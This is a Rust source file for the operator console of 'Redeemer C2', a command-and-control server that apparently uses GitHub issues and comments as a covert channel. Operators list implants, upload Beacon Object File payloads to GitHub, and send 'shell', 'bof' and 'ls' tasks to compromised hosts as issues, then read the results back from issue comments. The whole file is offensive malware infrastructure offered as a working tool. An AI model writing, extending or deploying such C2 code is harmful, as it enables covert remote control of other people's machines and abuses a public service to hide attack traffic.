mod github_server;
mod config;
mod banner;
mod sql;

use github::{self, upload_file};
use clap::{Parser,Subcommand};
use std::{io::{self, Write}, path::PathBuf};
use ansi_term::Colour;
use tokio::time::{sleep, Duration, Instant};

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
#[command(name = "Redeemer_server")]
#[command(version = "1.0")]
#[command(author = "chernox")]
#[command(about = "Redeemer C2.")]


struct RC2Server {
    #[command(subcommand)]
    mode: Mode,

    #[arg(long, short, value_name = "FILE",value_parser = validate_path)]
    config: Option<PathBuf>,
}

#[derive(Subcommand, Debug)]
enum Mode {
    Github ,
}

fn validate_path(value: &str) -> Result<PathBuf, String> {
    let path = PathBuf::from(value);
    if path.exists() && path.is_file() {
        Ok(path)
    } else {
        Err(format!("The path '{}' does not exist or is not a file.", value))
    }
}


#[tokio::main]
async fn main() {
    banner::print_banner();

    let teamserver = RC2Server::parse();
    match &teamserver.mode {
        Mode::Github => {
            println!("Using: Github Teamserver");
        }
    }
     
    //load config
    let github_config: github::GithubConfig;
    if let Some(config_file) = &teamserver.config {
        println!("Config file: {}", config_file.display().to_string());


        github_config = if let Ok(config) = config::load_config(&config_file) {
                banner::print_conf(&config);
                config.github
        } else {
                eprintln!("Failed to load config");
                return;
        };
    }else {
        println!("Using the default config file.");
        let default_config:PathBuf = ".\\config.yaml".into();
        println!("Config file: {}", Colour::Green.paint(default_config.display().to_string()));

        //github config
        github_config = if let Ok(config) = config::load_config(&default_config) {
            banner::print_conf(&config);
            config.github
        } else {
            eprintln!("Failed to load config");
            return; 
        };
    }

    //数据库初始化
    match sql::init_db() {
        Ok(_) => banner::print_info("Init Database Success"),
        Err(err) => eprintln!("[-] error init db: {}", err),
    }

    
    //任务列表
    let console_tasks = vec!["help", "implants", "use","load", "exit"];
    let session_tasks = vec!["help","shell","bof", "background","ls"];

    //implants监控
    let config_copy = github_config.clone();
    tokio::spawn(async move {
        if let Err(e) = github_server::lable_monitor(&config_copy).await {
                eprintln!("Error in label monitor: {}", e);
        }
    });

    let conn = sqlite::open("database.db").unwrap();

    loop{
        // 获取任务输入
        let mut task = String::new();
        print!("\n{}", Colour::Green.paint("redeemer > ")); 
        io::stdout().flush().unwrap();
        io::stdin().read_line(&mut task).expect("Failed to read input");
        let task = task.trim().to_string(); 

        // 任务处理
        if task == "" {
            continue;
        }

        if task == "help" {
            banner::print_console_help();
            continue;
        }
        if !console_tasks.iter().any(|&t| task.starts_with(t)) {
            println!("{} error command!",Colour::Yellow.paint("[-]"));
            banner::print_console_help();
            continue;
        }

        if task == "implants"{
            let implants = sql::get_all_implants(&conn).unwrap();
            banner::print_implants(&implants);
            continue;
        }

        if task == "load"{
            let current_dir = std::env::current_dir().expect("Failed to get current directory");
            let bof_dir = current_dir.join("bof");
            if !bof_dir.exists() {
                println!("{} Directory 'bof' does not exist.",Colour::Yellow.paint("[-]"));
                return;
            }
            let o_files = config::find_bof_files_in_dir(&bof_dir);
            if o_files.is_empty() {
                println!("{} No .o files found in directory 'bof'.",Colour::Yellow.paint("[-]"));
            } else {
                banner::print_info("Found .o files:");
                for file in o_files {
                    match upload_file(&github_config, &file).await{
                        Ok(_resp) =>{
                            //println!("{}",resp);
                            println!("{} upload success!", file.display());
                        },
                        Err(e) =>{
                            eprintln!("Failed to upload file: {}", e);
                        }
                    }
                }
            }
            
        }
        //进入use逻辑
        if task.starts_with("use "){
            let session_id = task.trim_start_matches("use ").trim().to_string();
            
            if sql::check_metadata_exists(&conn, &session_id).unwrap(){
                loop{
                    let mut session_task = String::new();
                    print!("\nSession({}) > ", Colour::Green.paint(&session_id)); 
                    io::stdout().flush().unwrap();
                    io::stdin().read_line(&mut session_task).expect("Failed to read input");
                    let session_task = session_task.trim().to_string(); 

                    if session_task == "help" {
                        banner::print_session_help();
                        continue;
                    }
                    if session_task == "background" {
                        break;
                    }

                    if !session_tasks.iter().any(|&t| session_task.starts_with(t)) {
                        println!("{} error command!",Colour::Yellow.paint("[-]"));
                        banner::print_session_help();
                        continue;
                    }

                    //提交task
                    let issue_id = if let Ok(issue_id) = github::post_issue(&github_config,&session_task,&session_id).await{
                        println!("{} Running task : {}", Colour::Cyan.paint("[*]"),&session_task);
                        println!("{} Task post success , Issue_id : {}", Colour::Cyan.paint("[*]"),&issue_id.to_string());
                        issue_id
                    }else{
                        eprintln!("Failed to post issue");
                        0
                    };


                    //获取结果
                    let timeout = Duration::from_secs(60);
                    let start_time = Instant::now();
                    while start_time.elapsed() < timeout {
                        match github::get_comment(&github_config, &issue_id).await {
                            Ok(comment) => {
                                if comment.body.is_empty() {
                                    continue;
                                } else {
                                    for line in &comment.body {
                                        println!("{}", line);
                                    }
                                    break;
                                }
                            }
                            Err(_) => {
                                eprintln!("Failed to get comment, retrying...");
                            }
                        }
                        // 每次重试等待 3 秒
                        sleep(Duration::from_secs(3)).await;
                    }

                }

            }else{
                println!("{} Session id Not Found!",Colour::Yellow.paint("[-]"))
            }
        }
  

    }






}
